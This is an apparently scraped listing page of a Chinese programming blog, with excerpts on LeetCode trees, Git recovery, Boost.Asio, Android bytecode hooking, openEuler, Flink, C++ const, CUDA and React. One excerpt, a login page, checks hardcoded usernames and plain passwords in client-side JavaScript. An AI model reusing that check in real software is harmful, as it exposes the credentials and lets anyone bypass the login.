百度百科中最近公共祖先的定义为：“对于有根树 T 的两个节点 p、q，最近公共祖先表示为一个节点 x，满足 x 是 p、q 的祖先且 x 的深度尽可能大（一个节点也可以是它自己的祖先）。”
来源：力扣（LeetCode）
链接：https://leetcode-cn.com/problems/lowest-common-ancestor-of-a-binary-tree
例：
输入：root = [3,5,1,6,2,0,8,null,null,7,4], p = 5, q = 1
输出：3
解释：节点 5 和节点 1 的最近公共祖先是节点 3 。
解析：
将找到节点或空节点，作为终止条件进行返回。对当前节点的左节点和有节点进行函数调用，若两个返回值都不为空，则代表当前节点为公共祖先。若只有一个不为空，则返回那个节点，
# Definition for a binary tree node. # class TreeNode(object): # def __init__(self, x): # self.val = x # self.left = None # self.right = None class Solution(object): def lowestCommonAncestor(self, root, p, q): """ :type root: TreeNode :type p: TreeNode :type q: TreeNode :rtype: TreeNode "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9679b8c1a4e32d37586328ffa532a7c3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4ede8e66733fa8f7acbaa5acf3cfcacf/" rel="bookmark">
			IDEA进行了Pull操作，Merge时选择了他们的优先，但自己的代码没有Push导致自己未提交的代码没了，头脑发热我差点哭出来解决方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 IDEA进行了Pull操作，Merge时选择了他们的优先，但自己的代码没有Push导致自己未提交的代码没了，头脑发热我差点哭出来解决方案 问题背景解决方案心得Lyric： 沉默是因为包容 问题背景 我和胖哥同时在一个项目里面开发，我让他先上传，我再去pull他上传的代码，然后我pull了他的代码，选择了merge，选择了他的优先，结果把我自己未提交的代码给干没了，那心情那血压瞬间就上来了，我开发了好几天的代码啊啊啊啊啊啊啊
解决方案 1 可以使用git的unstash恢复未提交的代码
但我里面啥都没有，以失败告终
2 回退版本，其实对我也没用，因为我代码是未提交的代码，回退退到上个git版本，失败告终
3 最后在History里面可以找到IDEA的缓存记录，感谢IDEA的强大
比如我现在选择的pom文件，可以选择一个时间节点，点击右键进行恢复
心得 还好IDEA有时间节点的历史缓存，不然这次真的就凉凉了为了避免下一次这样的情况，可以先进行stash，然后pull之后进行unstash，慢慢恢复
作为程序员第 113 篇文章，每次写一句歌词记录一下，看看人生有几首歌的时间，wahahaha … Lyric： 沉默是因为包容 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/145f8d309c884628e75baacb4274536c/" rel="bookmark">
			C&#43;&#43;网络编程 - Boost::asio异步网络编程 - 01- boost库源码编译安装
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 boost库是什么 Boost是为C++语言标准库提供扩展的一些C++程序库的总称。Boost库是一个可移植、提供源代码的C++库，作为标准库的后备，是C++标准化进程的开发引擎之一，是为C++语言标准库提供扩展的一些C++程序库的总称。
Boost库由C++标准委员会库工作组成员发起，其中有些内容有望成为下一代C++标准库内容。在C++社区中影响甚大，是不折不扣的“准”标准库。
Boost由于其对跨平台的强调，对标准C++的强调，与编写平台无关。但Boost中也有很多是实验性质的东西，在实际的开发中使用需要谨慎。
--------------转载百度百科：boost（C++程序库的总称）_百度百科
Boost::asio还没有正式的成为C++标准库，因此如果使用Boost::asio进行网络I/O编程，需要先在当
前系统平台上安装boost库相关的头文件和lib库文件，我们采用的是boost库源码编译安装，这篇文
章主要介绍在Windows和Linux环境下安装boost库。
WIndows和Linux平台的boost源码包下载云盘链接(zip是Windows版，tar.gz是Linux版，你也可以
去boost官网下载最新版本)：
链接：https://pan.baidu.com/s/11tNt-GNmt1xw_fGQ-tARgA 提取码：7yb9
2 Boost开发环境搭建 2.1 Windows VS2017 Boost库环境搭建 下载boost库的源码压缩包boost_1_69_0.zip，解压后，打开VS的工具命令行（注意不是Windows的cmd），切换到boost源码包路径下，执行bootstrap.bat这个批处理文件，等待一会儿，打印如下：
D:\资料\c++资料\boost_1_69_0&gt;bootstrap.bat
Building Boost.Build engine
Bootstrapping is done. To build, run:
.\b2 To adjust configuration, edit ‘project-config.jam’.
Further information:
- Command line help: .\b2 --help - Getting started guide: http://boost.org/more/getting_started/windows.html - Boost.Build documentation: http://www.boost.org/build/doc/html/index.html 会在boost源码路径下生成b2.exe文件，默认执行b2.exe（它有很多参数，简单起见这里直接默认执行，不带任何参数），如下：
D:\资料\c++资料\boost_1_69_0&gt;b2.exe
Performing configuration checks
- default address-model : 32-bit - default architecture : x86 … 然后就开始boost库源代码编译工作，源码比较大，这里编译时间较长，编译完成打印如下：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/145f8d309c884628e75baacb4274536c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d64776cfe0b00ac7b3e7751a3241fb05/" rel="bookmark">
			【工具笔记】AviatorEvaluator制作一个时间校验
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		定时任务需要，使用AviatorEvaluator做一个与当前判断的规则引擎。使用时间格式yyyy-MM-dd HH:mm和cron表达式进行校验。
例子1(单次时间校验)：timer:2022-04-18 15:55
例子2(多次时间校验)：cron:* 56 * * * ?
&lt;dependency&gt; &lt;groupId&gt;com.googlecode.aviator&lt;/groupId&gt; &lt;artifactId&gt;aviator&lt;/artifactId&gt; &lt;version&gt;5.3.0&lt;/version&gt; &lt;/dependency&gt; import java.text.SimpleDateFormat; import java.util.Date; import java.util.HashMap; import java.util.Map; import com.googlecode.aviator.AviatorEvaluator; /** * * @DESCRIPTION:定时校验 * @TODO:未实现的事情 * @author xiaokong * @date 2022年4月15日 * @version 1.0.0 * @file com.frame.util.RuleUtil.java */ public class AviatorUtil { private static Map&lt;String, Long&gt; REPETITION_TIME = new HashMap&lt;String, Long&gt;(); static { System.out.println(".........................."); AviatorEvaluator.addFunction(new AviatorTimerFunction()); } /** * * @DESCRIPTION:时间规则 * @TODO:未实现的事情 * @param timerVerifyParam:验证 参数；例如【循环验证(cron表达式):cron:* 3 * * * ?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d64776cfe0b00ac7b3e7751a3241fb05/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b88faeaa1e69d5e18be83b179015e387/" rel="bookmark">
			boost.Asio安装&amp;编译 ubuntu20.04
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		boost.Asio安装&amp;编译 ubuntu20.04 安装步骤编译 boost.asio是一个跨平台c++网络库，提供网络、底层IO操作。让程序员网络编程更简单。
安装步骤 首先安装boost
sudo apt-get install libboost-all-dev
接着安装boost.asio
sudo apt-get install -y libasio-dev
编译 先准备示例代码。
#include &lt;iostream&gt; #include &lt;boost/asio.hpp&gt; int main() { boost::asio::io_context io; boost::asio::steady_timer t(io, boost::asio::chrono::seconds(5)); t.wait(); std::cout &lt;&lt; "Hello, world!" &lt;&lt; std::endl; return 0; } 用whereis命令确定自己的安装位置，这里我的是/usr/include
然后编译。
g++ example1.cpp -o a.out -L /usr/include -lboost_system -lboost_thread -lpthread
成功
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/976acbc3b7d5fc0f7e686196d00d7703/" rel="bookmark">
			Android C/C&#43;&#43;层hook和java层hook原理以及比较
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		作者：Denny Qiao（乔喜铭），云智慧/架构师。 云智慧集团成立于2009年，是全栈智能业务运维解决方案服务商。经过多年自主研发，公司形成了从IT运维、电力运维到IoT运维的产业布局，覆盖ITOM、ITOA、ITSM、DevOps以及IoT几大领域，为金融、政府、运营商、能源、交通、制造等上百家行业的客户，提供了数字化运维体系建设及全生命周期运维管理解决方案。云智慧秉承Make Digital Online的使命，致力于通过先进的产品技术，为企业数字化转型和提升IT运营效率持续赋能。 android java层hook机制 android dalvic虚拟机和JVM的区别 Dalvik虚拟机并不是按照Java虚拟机的规范来实现的，与jvm并不兼容 Java虚拟机运行的是Java字节码，而Dalvik虚拟机运行的则是其专有的文件格式DEX（Dalvik Executable） Davic读取的是dex文件，jvm读取的.class和jar文件 Dalvik基于寄存器，而JVM基于栈 每一个Android应用都运行在一个Dalvik虚拟机实例里，而每一个虚拟机实例都是一个独立的进程空间。虚拟机的线程机制，内存分配和管理，Mutex等等都是依赖底层操作系统而实现的。所有Android应用的线程都对应一个Linux线程，虚拟机因而可以更多的依赖操作系统的线程调度和管理机制 有一个特殊的虚拟机进程Zygote，他是虚拟机实例的孵化器。每当系统要求执行一个Android应用程序，Zygote就会FORK出一个子进程来执行该应用程序。它在系统启动的时候就会产生，它会完成虚拟机的初始化、库的加载、预置类库和初始化的操作。如果系统需要一个新的虚拟机实例，它会迅速复制自身，以最快的速度提供给系统 android的启动流程 android的编译结构图 android hook 原理 Javac流程 Java 类文件是8位字节的二进制流 Android dalvik虚拟机相比jvm有一个dex模块 目的是：优化class，减小体积，加快加载运行速度，我们hook的关键就是修改class文件，在原有class文件中增加，修改方法或者变量，以便加入我们的hook代码到class中，自动埋点。在android中hook的入口点是dex模块。 修改class的关键技术： asm框架 ASM 是一个 Java 字节码操控框架。它能被用来动态生成类或者增强既有类的功能。 ASM 可以直接产生二进制 class 文件，也可以在类被加载入 Java 虚拟机之前动态改变类行为。 Java class 被存储在严格格式定义的.class 文件里，这些类文件拥有足够的元数据来解析类中的所有元素：类名称、方法、属性以及 Java 字节码（指令）。 ASM 从类文件中读入信息后，能够改变类行为，分析类信息，甚至能够根据用户要求生成新类。 Android hook的实现方案 直接修改android SDK中的dex模块dx.jar，用asm修改dx.jar中加载class的入口API，在函数中加入我们hook机制代码，对每一个加载的class进行代码注入。最后以安装包的形式提供用户。 优点：一劳永逸，适用于所有的android 开发工具，适合eclipse，android studio，各种脚本编译等，开发工期短。在初期，我们采用这种方法，很快完成了产品的开发，推向市场。 缺点：安装过程中需要替换用户android sdk中的dx.jar文件，属于侵入式安装，有一些用户不太接受。Android sdk不断的升级，我们也需要不断推出新的sdk，升级维护比较麻烦。 插件机制：需要实现不同的开发环境的插件：eclipse插件，gradle插件，各种自动化编译脚本的插件等。 基本原理：在各个编译工具调用dx完成dex的过程中，通过编译环境提供的接口，调用我们class注入代码。 优点：用户使用比较方便，不用修改用户android SDk环境，升级维护方便。比如gradle插件，版本放在jcenter仓库，直接配置就可以了。 实现方案的特点 针对各个开发环境，实现插件，在编译过程中对class文件进行hook。这是一种静态hook，不影响系统运行效率，而且对android的系统兼容性较好。 但是有一个缺点，不能hook android sdk，只能hook sdk之上的代码，那么随着不同模块代码的升级和改变，我们的hook 代码就不得不随之改变，而且需要不断适配新出现的第三发功能模块。不断地推出新的sdk版本支持这种变化。需要升级，维护。代码体积以及内存，CPU等性能逐渐降低。 Android c/c++ hook android的ndk简介 NDK是Google为Android进行本地开发而放出的一个本地开发工具，包括Android的Na#ve API、公共库以及编译工具。 注意：NDK需要Android 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/976acbc3b7d5fc0f7e686196d00d7703/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5b892a5b95eead0733afaedbd905669e/" rel="bookmark">
			openEuler
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		快速入门 本文档以TaiShan 200服务器上安装openEuler 20.03 LTS为例，旨在指导用户快速地安装和使用openEuler操作系统，更详细的安装要求和安装方法请参考《openEuler 20.03 LTS 安装指南》。
快速入门 安装要求获取安装源发布包完整性校验启动安装安装查看系统信息 安装要求 硬件兼容支持
支持的服务器类型如[表1]所示。
表 1 支持的服务器类型
服务器形态服务器名称服务器型号机架服务器TaiShan 2002280均衡型机架服务器FusionServer Pro 机架服务器FusionServer Pro 2288H V5说明：服务器要求配置Avago 3508 RAID控制卡和启用LOM-X722网卡。 最小硬件要求
最小硬件要求如表2所示。
表 2 最小硬件要求
部件名称最小硬件要求说明架构AArch64x86_64支持Arm的64位架构。支持Intel的x86 64位架构。CPU华为鲲鹏920系列CPUIntel® Xeon®处理器-内存不小于4GB（为了获得更好的应用体验，建议不小于8GB）-硬盘为了获得更好的应用体验，建议不小于120GB支持IDE、SATA、SAS等接口的硬盘。 获取安装源 请按以下步骤获取openEuler的发布包和校验文件：
登录openEuler社区网站。单击“下载”。单击“获取ISO：”后面的“Link”，显示版本列表。单击“openEuler-20.03-LTS”，进入openEuler 20.03 LTS版本下载列表。单击“ISO”，进入ISO下载列表。 aarch64：AArch64架构的ISO。x86_64：x86_64架构的ISO。source：openEuler源码ISO。 根据实际待安装环境的架构选择需要下载的openEuler的发布包和校验文件。 若为AArch64架构。 单击“aarch64”。单击“openEuler-20.03-LTS-aarch64-dvd.iso”，将openEuler发布包下载到本地。单击“openEuler-20.03-LTS-aarch64-dvd.iso.sha256sum”，将openEuler校验文件下载到本地。 若为x86_64架构。 单击“x86_64”。单击“openEuler-20.03-LTS-x86_64-dvd.iso”，将openEuler发布包下载到本地。单击“openEuler-20.03-LTS-x86_64-dvd.iso.sha256sum”，将openEuler校验文件下载到本地。 发布包完整性校验 为了防止软件包在传输过程中由于网络原因或者存储设备原因出现下载不完整的问题，在获取到软件包后，可按以下步骤将获取到的openEuler的软件包进行完整性校验。
获取校验文件中的校验值。执行命令如下：
$ cat openEuler-20.03-LTS-aarch64-dvd.iso.sha256sum 计算文件的sha256校验值。执行命令如下：
$ sha256sum openEuler-20.03-LTS-aarch64-dvd.iso 命令执行完成后，输出校验值。
对比步骤1和步骤2计算的校验值是否一致。
如果校验值一致说明iso文件完整性没有破坏，如果校验值不一致则可以确认文件完整性已被破坏，需要重新获取。
启动安装 登录服务器iBMC Web界面。具体方法请参考《TaiShan 200 服务器 用户指南 (型号 2280) 》。
在上方标题栏中，选择“配置”，在左侧导航树中选择“系统启动项”，显示“系统启动项”界面。
将“引导介质有效期”和“引导介质”分别设置为“单次有效”和“光驱”，并单击“保存”以保存配置。如图1所示。
图 1 设置系统启动项
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5b892a5b95eead0733afaedbd905669e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ca3f898d2be52bf3c4067aa4ee367958/" rel="bookmark">
			C语言：秒数转换为时分秒
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 【问题描述】
提示用户输入秒数，然后给出这个秒数里面整小时数，剩余部分继续转换为整分钟数，并给出剩余多少秒。
【输入形式】
Please input time in seconds:1234567
【输出形式】
Hours: 342
Minutes: 56
Seconds: 7
#include&lt;stdio.h&gt; int main() { int h,m,s,n; printf("Please input time in seconds:"); scanf("%d",&amp;n); h=n/3600; m=n%3600/60; s=n%60; printf("Hours:%d\n",h); printf("Minutes:%d\n",m); printf("Seconds:%d\n",s); return 0; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/58e70ce6b228946ceca2e09582ba8e18/" rel="bookmark">
			Flink 流批一体在小米的实践
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		摘要：本文整理自小米软件开发工程师金风在 Flink Forward Asia 2021 流批一体专场的演讲。本篇内容主要分为四个部分：
小米的大数据发展演变
流批一体的平台建设
流批一体应用场景
未来规划
一、小米的大数据发展演变
2019 年之前，小米的实时计算主要以 SparkStreaming 为主，少部分 Storm，离线计算以 Spark 为主。
2019 年，开始接入 Flink，并广泛应用于信息流搜索推荐、广告实时样本、实时 ETL 等场景，逐步替换了原来的 SparkStreaming 作业，得益于 Flink 框架的各种优秀特性，我们在作业的正确性，实时性，资源使用效率方面都有较大提升。
2020 年，开始接入使用 FlinkSQL，并广泛用于实时数仓的建设和实时 ETL 作业的开发。FlinkSQL 的实时数仓将数据链路由 T+1 降低到了秒级。
2021 年，开始接入数据湖 Iceberg，基于 Flink 和 Iceberg 来构建流批一体的实时数仓解决方案，并在小米内部的部分业务进行了落地，证明流批一体在赋能业务、提升作业开发效率、简化链路节省资源的方面是可行的。
上图是小米当前的实时和离线框架，目前是多种框架并存的状态。业务开发人员无论是写 SQL 作业还是写 Jar 包作业，都至少要维护两套代码。公司内部的计算引擎团队也需要花两拨人力分别去维护不同的计算框架，同时平台层也需要对不同的计算引擎去做不同的适配。
基于流批一体的改造，无论是实时还是离线都只需要维护一套计算框架，为业务开发人员、平台提供方和计算引擎的支持方节省了一半的人力资源。
二、流批一体的平台建设
为了探索流批一体，我们也做了很多相关的探索和实践。
对于流批一体的平台化建设，主要分为 4 个方面，分别是元数据管理、权限管理、作业调度以及 Flink 的生态建设。
2.1 元数据管理 我们基于 Metacat 做了统一的元数据管理，由 Metacat 统一对接下游不同的存储系统和上游的计算引擎。
基于 Metacat，内部的所有系统都被统一划分成三级结构，与 FlinkSQL 的三级结构相对应。
第一级 Catalog，主要由服务名和集群名拼接而成。
第二级 Database，它与大部分系统的 Database 保持一致。没有 Database 的系统默认使用 default 来代替。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/58e70ce6b228946ceca2e09582ba8e18/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/773e80c0a1d2d8634b59196b2ced8d42/" rel="bookmark">
			C&#43;&#43;学习笔记：const和mutable的多种用法【Cherno】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		先来带着几个问题来：
为什么要const、mutable声明，const、mutable的运用场景是什么；
1：为什么要有const、mutable声明：
const声明相当于你向系统的一个承诺，承诺不会改变声明对象的值；
但有人想，有必要吗，我不改不就行了吗。当然，如果您一直不改，那声明和不声明const的功效是差不多的，但是事与愿违，很多时候您不小心会改变自己不希望改的值，从而导致bug的产生，而const就是让系统监督这个变量，如果您不小心改变了变量，那么系统就会报错；
而mutable就是在某种特别的情况下，用于违背这个约定的声明；
2：const和mutable的用法：
一般const是运用于指针和类中函数的约束，分3种情况：
（1）不希望改变指针的指向改变
（2）不希望通过指针改变指针指向对象的内容
（3）不希望类中的函数改变类中的变量
可以看出来，这些运用场景都是为了保护某些个量
我们先看第一中场景：
我们知道，定义一个指针的形式为：
int *x; 所以我们不希望指针的指向改变，所以const应该作用于*x，故一个不可改变指向的*x的格式为：
int* const x=&amp;y; 注意，这样的指针应该在定义时就给其赋予一个地址，否则会成为野指针；
这种声明它是可以通过指针改变指向对象的值的；
我们如果希望不可以通过指针改变指向对象的值的话，我们可以通过以下声明完成：
int const* x=&amp;y; 这个时候如果呢通过x改变y的值，那么系统会报错；
但是这种声明它是可以改变指针的指向的，改变指向后仍然不能通过该指针改变指向对象的值；
那么来看类中函数怎么使用const；
有的时候，我们会些一些检测类的函数或者输出类的函数，这些函数往往是不必要改变变量的值的；
如果您有这个述求，那么可以通过const让函数变得更加安全；
看下面的代码：
#include&lt;iostream&gt; using namespace std; class A { int x; public: A(int mid) :x(mid){} void Get_x()const { cout &lt;&lt; x; } }; int main() { A t (1); t.Get_x(); } 我们可以看到Get_x函数右边有一个const声明，这个声明就是告诉系统，Get_x这个函数不能改变成员变量：
如果我们将Get_x改为：
void Get_x()const { x=2; cout &lt;&lt; x; } 那么系统会报错：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/773e80c0a1d2d8634b59196b2ced8d42/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e3afea7401b854abb4111e2b5f40d5ad/" rel="bookmark">
			给自己定个小目标：利用python进行数据分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
引言
准备工作
第三章ipython
第四章Numpy
参考文献
引言 在【杂谈】珍惜最后的学校生活中说过我喜欢折腾，现在的工作不算特别忙，所以好好把握空闲时间提升自己，慢慢积累。
从今天开始，每天进步一点点，下班花一到两个小时捋这本书《利用python进行数据分析》……
这本书几乎是数据分析入门必读书，作者是Wes McKinney，机械工业出版社。光看书可能有一点干巴巴的，可以结合参考3中的部分链接一起学习。
准备工作 首先完成jupyter和ipython的相关安装和配置，检查了一下发现以前都装过了，安装也很简单，直接pip install 就可，跳过
jupyter电脑中已经安装，但是到指定目录运行jupyter notebook出现错误提示‘jupyter’不是内部命令，参见参考文献1，进行环境变量的配置
再次运行可以了，默认浏览器会自动打开jupyter的页面
ipython是python的一个交互式shell，更多的可以参见参考文献2以及本博文下一部分.
其实平时用惯了pycharm，不过该书花了一个章节讲这个，就简单学习一下。检查是否安装
这样就是可以了。
也可以直接输入ipython qtconsole，进入图形化界面
回车进入
其他很多依赖库就不一一细说了
第三章ipython ipython的几个特点
输入表达式时，只要按下tab键，当前命名空间中任何与已输入的字符串匹配的变量或其他都会被找出来 对象内省：在变量前后加上 (?) 可以将该对象的一些通用信息显示出来，(??) 还可以显示函数的源代码，这样的功能结合通配符 (*) 可以用来搜索ipython的命名空间 利用%run project_name.py可以运行脚本程序，如果脚本要访问ipython命名空间中的变量，应使用%run -i 中断正在执行的代码，按下ctrl-c执行剪贴板中的代码（这一块直接略过，感觉没什么实际使用的价值）魔术命令，ipython的一些特殊命令，一个%magic显示所有魔术命令的详细文档最实用 执行%logstar，记录整个控制台会话的输入输出 ipython对输入输出变量的自动保存是一个挺有意思的点
Ipython会将输入（输入的文本）保存在_iX，其中X是输入行的行号
每一个输入变量对应的输出（返回的对象）保存在_X
几点不错的代码设计原则
“扁平结构要比嵌套结构好”，编写函数和类的时候要尽量注意低耦合和模块化对于Ipython来说，多个小文件不如一个大文件（注意度） Ipython会自动获取__repr__方法返回的字符串，可以对输出形式进行一定的设置，使得显示更加友好
第四章Numpy （刚说完工作不是很忙，就来了紧急需求，又要放慢进度了）
参考文献 参考1：‘jupyter‘ 不是内部或外部命令，也不是可运行的程序 或批处理文件。解决方案
参考2：IPython介绍
参考3：猴子的回答——如何学习和评价《利用python进行数据分析》这本书？
其实我一直有意向成立一个学习互助小组，但是觉得本身自己不定性，而且学东西很随性，所以就一直搁浅了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6df4841ce920f61ab2305d1ac9d18fa0/" rel="bookmark">
			登录界面js验证用户名密码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		&lt;html&gt;
&lt;!DOCTYPE html&gt;
&lt;html lang="en" class="no-js"&gt;
&lt;%@ page contentType="text/html;charset=utf-8" language="java" errorPage="" %&gt;
&lt;head&gt;
&lt;title&gt;登录(Login)&lt;/title&gt;
&lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
&lt;meta name="description" content=""&gt;
&lt;meta name="author" content=""&gt;
&lt;script type="text/javascript"&gt;
function val(){
var name=window.document.getElementById("username").value;
var password=window.document.getElementById("password").value;
if (name == ""){
window.alert("用户名不能为空!");
return false;
}
if (password ==""){
window.alert("密码不能为空!");
return false;
}
if(name!="zhuxiaolong" &amp;&amp; name!="AAA"){
window.alert("用户名错误!");
return false;
}
if(password!="123456" &amp;&amp; password!="1234"){
window.alert("密码错误!");
return false;
}
return true;
}
&lt;/script&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;div class="page-container"&gt;
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6df4841ce920f61ab2305d1ac9d18fa0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/36d08bba86f7dd313d602b7614a57441/" rel="bookmark">
			解决React18.0.0版本报错问题（降低React版本）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 由于React最近新出18.0.0版本
所以create-react-app创建的项目默认为react18版本
目前有很多不适配不支持 比如Ant Design Mobile插件库
解决方案 降低版本 输入命令：npm install react@17.x react-dom@17.x --save 查看当前React版本 自己的React版本可以在项目的package.json文件中看到，搜索“react”，即可看到版本号：
查看React最新版本命令 npm info react 当然后续如果想安装React最新版本（安装最新版本号 比如：18.0.0）： npm install react@18.0.0 react-dom@18.0.0 --save 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4046cf856625a55e2ed38988199699a7/" rel="bookmark">
			【深度学习】Windows下CUDA&#43;CUDNN安装教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 1 前提要求2 查询需要安装的版本3 下载并安装CUDA3.1 下载3.2 安装 4 下载并安装cuDNN4.1 下载4. 2安装 5 配置环境并验证CUDA安装6 报错解决 1 前提要求 （1）在安装CUDA之前，必须已将安装好了VS
（2）电脑必须要有 NVIDIA 独立显卡
（3）显卡是否支持CUDA 检查可以参考→检查本机的GPU是否支持CUDA
2 查询需要安装的版本 本文提供三种方法：
第一种：以Windows10为例，在桌面上右键选择NVIDIA控制面板
第二种：点击Windows10自带的搜索，输入NVIDIA，按照下面操作就可以
用上面任意一种方法打开显卡控制面板是这样子的：
按照下面操作，就看到咱的驱动版本信息啦，这里是 CUDA 11.2
第三种：win+R打开cmd，输入nvidia-smi，也可以看到支持的cuda版本11.2啦
3 下载并安装CUDA 3.1 下载 知道了咱的版本，下面就下载这个CUDA啦，这里选择的版本不能高于显卡驱动里面那个版本号，比如我的就不能高于11.2，所以这里我选择了11.2.0版本
下载地址： https://developer.nvidia.com/cuda-toolkit-archive 传送门
3.2 安装 下载好了，接下来就要安装喽，管理员运行.exe安装程序
临时解压路径最后安装完毕会删掉的，所以是哪都无所谓，点击ok就可以了
哎呀，我的安装失败了，如果出现相同情况，可以看第6部分的报错解决
4 下载并安装cuDNN 4.1 下载 好了，接下来，下载相应的神经网络的加速库cuDNN吧，cuDNN的版本取决于上面下载的CUDA的版本，千万不要弄错哦！
下载地址： https://developer.nvidia.com/rdp/cudnn-archive 传送门
账户登录成功后会调到下面这个页面，点击下载即可；如果没有请重新从访问下载地址开始即可
4. 2安装 现在开始安装cuDNN了，其实就是替换文件，将下载的压缩包解压
解压完毕后，找到这三个文件
找到CUDA的安装目录，粘贴刚刚复制的三个文件
5 配置环境并验证CUDA安装 右键我的电脑——属性——右侧高级系统设置——环境变量
找到Path，把下面的环境变量加进入就OK了
最后一步了，win+R打开cmd，进入到CUDA安装目录下，输入nvcc -V，出现下面版本信息就安装好喽。
6 报错解决 5555555555555555555~ 解决安装失败问题了
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4046cf856625a55e2ed38988199699a7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aab5d3d08788dd6c199d1443b877cc30/" rel="bookmark">
			关于LocalDateTime的全局返回时间带“T“的时间格式处理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		关于LocalDateTime的全局返回带"T"的时间格式处理 1.关于jackson的全局返回带T的处理方式2.关于fastjson的全局返回带T的处理方式 关于背景的大概描述，如下。 时间类型LocalDateTime相较于于Date的确有自己独特的优势，因此在之后的版本迭代上，将部分隔离开的模块使用了新型的LocalDateTime替代了Date，因已经使用了全局时间转换，但是测试的时候发现返回的时间格式很奇怪 2022-01-01T00:00:00.000，全局时间序列化、反序列化并没有起作用，寻找相关资料和DEGBU之后将相关资料整理如下。 目前常用的时间类型格式如下： 时间类型时间默认格式DateTue Feb 01 00:00:00 CST 2022Timestamp2022-01-01 00:00:00.0LocalDateTime2022-01-01T00:00:00.000 1.关于jackson的全局返回带T的处理方式 对于Date和Timestamp在引入LocalDateTime之前是经过spring.jackson.date-format进行全局数据绑定格式化时间类型。
spring: jackson: date-format: 格式化类 在格式化类中添加对LocalDateTime的格式化语句发现无效果。经过搜索资料后发现在使用jackson在对localDateTime类型的序列化和反序列化方法另有其他方法。（这里不输出关于源码内的信息。可自行查看。）
// 涉及源码类 其余的可自行debug追踪 Jackson2ObjectMapperBuilder Jackson2ObjectMapperBuilderCustomizer // 最终做处理的服务类 JacksonAutoConfiguration @Configuration public class LocalDateTimeSerializerConfig { // jackson注册的时候会将序列化和反序列化的方法提前注册进，做数据转换会自行根据具体的实现去调用。 @Bean public Jackson2ObjectMapperBuilderCustomizer jackson2ObjectMapperBuilderCustomizer() { return builder -&gt; { builder.serializerByType(LocalDateTime.class, new LocalDateTimeSerializer(DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss"))); builder.deserializerByType(LocalDateTime.class, new LocalDateTimeDeserializer()); }; } /** * 反序列化 */ public static class LocalDateTimeDeserializer extends JsonDeserializer&lt;LocalDateTime&gt; { @Override public LocalDateTime deserialize(JsonParser p, DeserializationContext deserializationContext) throws IOException { long timestamp = p.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/aab5d3d08788dd6c199d1443b877cc30/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d0bbc8549ab7802f34ecde8cc071b7c6/" rel="bookmark">
			源码安装apache
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
